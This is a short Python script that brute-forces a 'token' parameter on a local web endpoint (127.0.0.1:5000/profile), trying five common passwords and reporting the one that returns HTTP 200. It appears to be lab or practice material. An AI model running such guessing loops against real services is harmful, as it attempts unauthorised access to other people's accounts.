import requests

WORDLIST = ["admin123", "password", "12345", "letmein", "qwerty"]
URL = "http://127.0.0.1:5000/profile"

for guess in WORDLIST:
    r = requests.get(URL, params={"token": guess})
    if r.status_code == 200:
        print(f"FOUND: {guess}")
        break
else:
    print("not found")
